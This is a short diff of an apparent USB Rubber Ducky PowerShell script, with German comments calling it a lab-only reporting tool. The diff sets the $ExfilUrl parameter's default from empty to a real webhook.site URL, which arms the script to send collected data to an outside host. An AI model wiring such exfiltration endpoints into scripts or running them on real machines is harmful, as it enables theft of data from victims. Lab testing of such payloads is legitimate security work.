@@ -7,7 +7,7 @@
 #  gemeldet, nicht entschluesselt (siehe README / Enterprise-Policy).
 #  NUR im eigenen, isolierten LAB einsetzen!
 # =====================================================================
-param([string]$ExfilUrl = '')
+param([string]$ExfilUrl = 'https://webhook.site/d20dc9cd-2743-45e9-8f2b-6016c3b7e30c')
 
 # ----------------------- CONFIG -----------------------
 $LabelRegex   = 'DUCK'   # Volume-Label des Ducky-STORAGE (Variante A)
